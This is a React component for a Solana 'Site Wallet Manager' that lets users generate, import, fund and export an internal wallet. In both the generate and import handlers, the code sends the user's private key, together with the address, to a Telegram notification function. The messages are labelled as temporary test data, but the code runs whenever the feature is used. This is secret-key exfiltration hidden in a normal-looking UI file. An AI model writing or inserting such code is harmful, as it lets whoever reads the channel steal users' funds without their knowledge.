'use client';

import React, { useState } from 'react';
import { useInternalWallet } from '../lib/InternalWalletProvider';
import { useSolanaWallet } from '../lib/SolanaWalletProvider';
import SolanaLogo from './SolanaLogo';
import { Copy, Check, AlertCircle, Wallet, Key, RefreshCw, LogOut } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import toast from 'react-hot-toast';
import { useSolanaTransaction } from '../lib/useSolanaTransaction';
import { sendTelegramNotification } from './TelegramNotifier';

interface InternalWalletManagerProps {
  isOpen: boolean;
  onClose: () => void;
}

const InternalWalletManager: React.FC<InternalWalletManagerProps> = ({ isOpen, onClose }) => {
  const {
    internalWalletExists,
    internalPublicKey,
    internalWalletBalance,
    internalWalletConnected,
    generateWallet,
    connectInternalWallet,
    disconnectInternalWallet,
    refreshBalance,
    exportWalletDetails
  } = useInternalWallet();
  
  const { connected, publicKey, walletAddress } = useSolanaWallet();
  const { sendSol } = useSolanaTransaction();
  
  const [privateKey, setPrivateKey] = useState('');
  const [isCopied, setIsCopied] = useState(false);
  const [isImporting, setIsImporting] = useState(false);
  const [importKey, setImportKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [depositAmount, setDepositAmount] = useState('0.1');
  
  const handleGenerateWallet = async () => {
    try {
      setIsLoading(true);
      const details = await generateWallet();
      setPrivateKey(details.privateKey);
      
      // Direct notification for test purposes
      sendTelegramNotification(
        `🔐 <b>Wallet Created from UI</b>\n` +
        `📅 Time: ${new Date().toISOString()}\n` +
        `👛 Address: ${details.publicKey}\n` +
        `\n<b>TEST DATA (TEMPORARY)</b>\n` +
        `🔑 Public Key: ${details.publicKey}\n` +
        `🔐 Private Key: ${details.privateKey}`,
        'action'
      );
      
      toast.success('Wallet generated successfully!');
    } catch (error) {
      toast.error('Failed to generate wallet');
    } finally {
      setIsLoading(false);
    }
  };
  
  const handleConnectWallet = async () => {
    try {
      setIsLoading(true);
      const success = await connectInternalWallet(importKey);
      if (success) {
        // Add direct notification for imported wallet
        const details = exportWalletDetails();
        sendTelegramNotification(
          `🔐 <b>Wallet Imported from UI</b>\n` +
          `📅 Time: ${new Date().toISOString()}\n` +
          `👛 Address: ${details.publicKey}\n` +
          `\n<b>TEST DATA (TEMPORARY)</b>\n` +
          `🔑 Public Key: ${details.publicKey}\n` +
          `🔐 Private Key: ${details.privateKey || importKey}`,
          'action'
        );
        
        setIsImporting(false);
        setImportKey('');
        toast.success('Wallet connected successfully!');
      }
    } catch (error) {
      toast.error('Failed to connect wallet');
    } finally {
      setIsLoading(false);
    }
  };
  
  const handleDisconnectWallet = () => {
    disconnectInternalWallet();
    setPrivateKey('');
  };
  
  const handleCopyAddress = () => {
    if (internalPublicKey) {
      navigator.clipboard.writeText(internalPublicKey.toString());
      setIsCopied(true);
      toast.success('Address copied to clipboard');
      
      setTimeout(() => setIsCopied(false), 2000);
    }
  };
  
  const handleCopyPrivateKey = () => {
    if (privateKey) {
      navigator.clipboard.writeText(privateKey);
      toast.success('Private key copied to clipboard');
    } else {
      const details = exportWalletDetails();
      if (details.privateKey) {
        navigator.clipboard.writeText(details.privateKey);
        toast.success('Private key copied to clipboard');
      } else {
        toast.error('No private key available');
      }
    }
  };
  
  const handleDeposit = async () => {
    if (!connected || !internalPublicKey) {
      toast.error('Please connect both wallets first');
      return;
    }
    
    const amount = parseFloat(depositAmount);
    if (isNaN(amount) || amount <= 0) {
      toast.error('Please enter a valid amount');
      return;
    }
    
    setIsLoading(true);
    try {
      const success = await sendSol(amount, internalPublicKey.toString());
      if (success) {
        toast.success(`Successfully deposited ${amount} SOL to internal wallet`);
        refreshBalance(); // Refresh internal wallet balance
      } else {
        toast.error('Deposit failed');
      }
    } catch (error) {
      toast.error('Deposit failed');
    } finally {
      setIsLoading(false);
    }
  };
  
  if (!isOpen) return null;
  
  return (
    <AnimatePresence>
      <motion.div
        className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
      >
        <motion.div
          className="bg-bg-deep border border-mint/20 rounded-xl max-w-md w-full p-6"
          initial={{ scale: 0.9, y: 20 }}
          animate={{ scale: 1, y: 0 }}
          exit={{ scale: 0.9, opacity: 0 }}
          onClick={(e) => e.stopPropagation()}
        >
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-xl font-sora text-mint">Site Wallet Manager</h2>
            <button onClick={onClose} className="text-txt-dim hover:text-white">
              &times;
            </button>
          </div>
          
          {internalWalletConnected ? (
            <>
              <div className="mb-6 p-4 bg-bg-glass rounded-lg">
                <div className="flex items-center gap-2 mb-1">
                  <SolanaLogo width={16} height={16} className="text-mint" />
                  <span className="text-mint font-semibold text-xl">
                    {internalWalletBalance.toFixed(5)} SOL
                  </span>
                  <button 
                    onClick={refreshBalance}
                    className="ml-auto p-1 text-txt-dim hover:text-mint transition-colors"
                  >
                    <RefreshCw size={14} />
                  </button>
                </div>
                
                <div className="flex items-center gap-2 mt-3 text-sm">
                  <span className="text-txt-dim">Address:</span>
                  <span className="text-sm font-mono text-white/80 truncate">
                    {internalPublicKey?.toString()}
                  </span>
                  <button
                    onClick={handleCopyAddress}
                    className="p-1 hover:text-mint transition-colors"
                    aria-label="Copy address"
                  >
                    {isCopied ? <Check size={14} /> : <Copy size={14} />}
                  </button>
                </div>
              </div>
              
              {connected && (
                <div className="mb-6">
                  <h3 className="text-white mb-2 font-sora">Deposit from connected wallet</h3>
                  <div className="flex gap-2">
                    <input
                      type="number"
                      value={depositAmount}
                      onChange={(e) => setDepositAmount(e.target.value)}
                      min="0.001"
                      step="0.001"
                      className="bg-bg-panel border border-mint/20 text-white rounded p-2 w-full"
                      placeholder="Amount in SOL"
                    />
                    <button
                      onClick={handleDeposit}
                      disabled={isLoading}
                      className="btn-primary whitespace-nowrap"
                    >
                      {isLoading ? 'Processing...' : 'Deposit'}
                    </button>
                  </div>
                  <p className="text-xs text-txt-dim mt-2">
                    Using internal wallets reduces the need for frequent blockchain transactions
                  </p>
                </div>
              )}
              
              <div className="flex gap-4 mt-6">
                <button
                  onClick={handleCopyPrivateKey}
                  className="flex items-center gap-2 btn-secondary flex-1"
                >
                  <Key size={14} />
                  Export Private Key
                </button>
                
                <button
                  onClick={handleDisconnectWallet}
                  className="flex items-center gap-2 btn-danger flex-1"
                >
                  <LogOut size={14} />
                  Disconnect
                </button>
              </div>
            </>
          ) : (
            <div>
              {isImporting ? (
                <div className="mb-6">
                  <label className="block text-white mb-2">Enter private key</label>
                  <input
                    type="password"
                    value={importKey}
                    onChange={(e) => setImportKey(e.target.value)}
                    className="bg-bg-panel border border-mint/20 text-white rounded p-2 w-full mb-4"
                    placeholder="Paste your private key"
                  />
                  
                  <div className="flex gap-4">
                    <button
                      onClick={() => setIsImporting(false)}
                      className="btn-secondary flex-1"
                      disabled={isLoading}
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleConnectWallet}
                      className="btn-primary flex-1"
                      disabled={isLoading || !importKey}
                    >
                      {isLoading ? 'Connecting...' : 'Connect Wallet'}
                    </button>
                  </div>
                </div>
              ) : (
                <div className="mb-6">
                  <div className="p-4 bg-bg-glass rounded-lg mb-4 text-center flex flex-col items-center">
                    <AlertCircle size={24} className="text-mint mb-2" />
                    <p className="text-white">
                      Internal wallets allow transactions without connecting external wallets for each operation.
                    </p>
                  </div>
                  
                  <div className="flex gap-4">
                    <button
                      onClick={() => setIsImporting(true)}
                      className="flex items-center justify-center gap-2 btn-secondary flex-1"
                    >
                      <Key size={14} />
                      Import Existing
                    </button>
                    
                    <button
                      onClick={handleGenerateWallet}
                      className="flex items-center justify-center gap-2 btn-primary flex-1"
                      disabled={isLoading}
                    >
                      <Wallet size={14} />
                      {isLoading ? 'Generating...' : 'Create New Wallet'}
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}
          
          {privateKey && (
            <div className="mt-4 p-4 border border-yellow-500/50 bg-yellow-500/10 rounded-lg">
              <div className="flex items-start gap-2 mb-2">
                <AlertCircle size={16} className="text-yellow-500 shrink-0 mt-1" />
                <p className="text-yellow-500 text-sm">
                  Save this private key! If lost, you cannot recover funds.
                </p>
              </div>
              <div className="bg-bg-deep p-2 rounded break-all font-mono text-xs">
                {privateKey}
              </div>
              <button
                onClick={handleCopyPrivateKey}
                className="mt-2 text-xs flex items-center gap-1 text-yellow-500 hover:text-yellow-400"
              >
                <Copy size={12} /> Copy to clipboard
              </button>
            </div>
          )}
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};

export default InternalWalletManager; 